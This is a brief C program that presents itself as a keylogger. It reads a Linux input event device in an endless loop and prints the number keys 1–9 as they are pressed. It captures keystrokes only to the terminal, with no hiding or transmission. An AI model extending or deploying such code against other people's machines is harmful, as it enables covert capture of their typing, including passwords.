#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <event-file>\n", argv[0]);
        exit(-1);
    }

    printf("Keylogger started...\n");

    int fd = open(argv[1], O_RDONLY, 0);
    printf("Opened file descriptor: %d\n", fd);
    struct input_event ie;
    // char key[100];
    while (1)
    {
        read(fd, &ie, sizeof(ie));

        if(ie.code >= 2 && ie.code <= 10){
        printf("Key pressed: %d\n", ie.code - 1);
        }
    }

    return 0;
}